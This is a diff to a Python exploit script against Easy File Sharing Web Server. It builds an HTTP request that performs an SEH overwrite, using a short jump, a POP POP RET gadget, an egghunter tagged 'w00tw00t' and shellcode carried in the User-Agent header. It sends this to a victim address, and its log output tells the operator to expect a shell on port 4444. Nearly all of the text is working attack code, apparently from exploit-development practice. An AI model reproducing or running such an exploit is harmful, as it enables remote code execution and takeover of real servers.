@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
 import socket
+from pwn import *
 
 victim_host = "10.0.0.213"
 victim_port = 80
@@ -62,11 +63,20 @@ payload += exploit_payload
 payload += "User-Agent: w00tw00t" + shellcode + "\r\n"
 payload += " HTTP/1.1\r\n"
 
-expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-expl.connect((victim_host, victim_port))
+try:
+    expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+    expl.connect((victim_host, victim_port))
+    expl.send(payload)
 
-expl.send(payload)
-print("[x] Easy File Sharing Web Server SEH overwrite")
-print("[x] Sending payload to victim")
-print("[!] You may need to send it mutiple times")
-expl.close()
+    log.info("Easy File Sharing Web Server SEH overwrite")
+    log.info("Sending payload to victim...")
+    log.info("Sending NSEH with short JMP")
+    log.info("Sending SEH with POP POP RET")
+    log.info("Sending egghunter, w00tw00t")
+    log.info("Watch NC for a shell on 4444\n")
+
+    print("[!] You may need to send it mutiple times")
+    expl.close()
+
+except:
+    print("[!] Error connecting to the victim")
